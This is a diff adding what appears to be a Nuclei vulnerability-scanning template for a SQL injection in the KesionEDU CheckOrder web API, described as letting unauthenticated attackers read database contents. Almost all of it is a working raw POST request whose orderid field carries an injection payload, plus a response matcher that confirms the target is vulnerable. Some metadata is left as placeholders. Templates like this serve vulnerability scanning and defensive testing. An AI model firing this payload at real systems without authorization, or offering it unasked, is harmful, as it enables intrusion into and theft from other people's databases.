@@ -1,0 +1,30 @@
+id: kxxz-CheckOrder-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 科汛新职教网校系统KesionEDU CheckOrder 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E6%B1%9B/%E7%A7%91%E6%B1%9B%E6%96%B0%E8%81%8C%E6%95%99%E7%BD%91%E6%A0%A1%E7%B3%BB%E7%BB%9FCheckOrder%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /webapi/APP/CheckOrder HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Priority: u=0
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 242
+
+        {"orderid":"1' AND 7755 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)))-- Ahbw","apptoken":"1","ordertype":"1"}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkpzq'
